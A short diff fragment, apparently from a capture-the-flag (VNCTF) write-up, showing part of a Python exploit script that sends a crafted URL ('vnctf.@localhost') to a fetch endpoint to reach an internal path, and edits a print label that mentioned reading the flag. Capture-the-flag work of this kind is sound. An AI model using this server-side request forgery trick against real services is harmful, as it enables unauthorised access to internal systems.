@@ -212,7 +212,7 @@ full_url = f"{TARGET_URL}/fetch?url=http://vnctf.@localhost:8080/__internal/safe
 # 4. 发送
 try:
     res = requests.get(full_url)
-    print(f"\n[+] cat<flag 执行结果:\n{res.text}")
+    print(f"\n[+]  执行结果:\n{res.text}")
 except Exception as e:
     print(f"[-] Error: {e}")
 ```
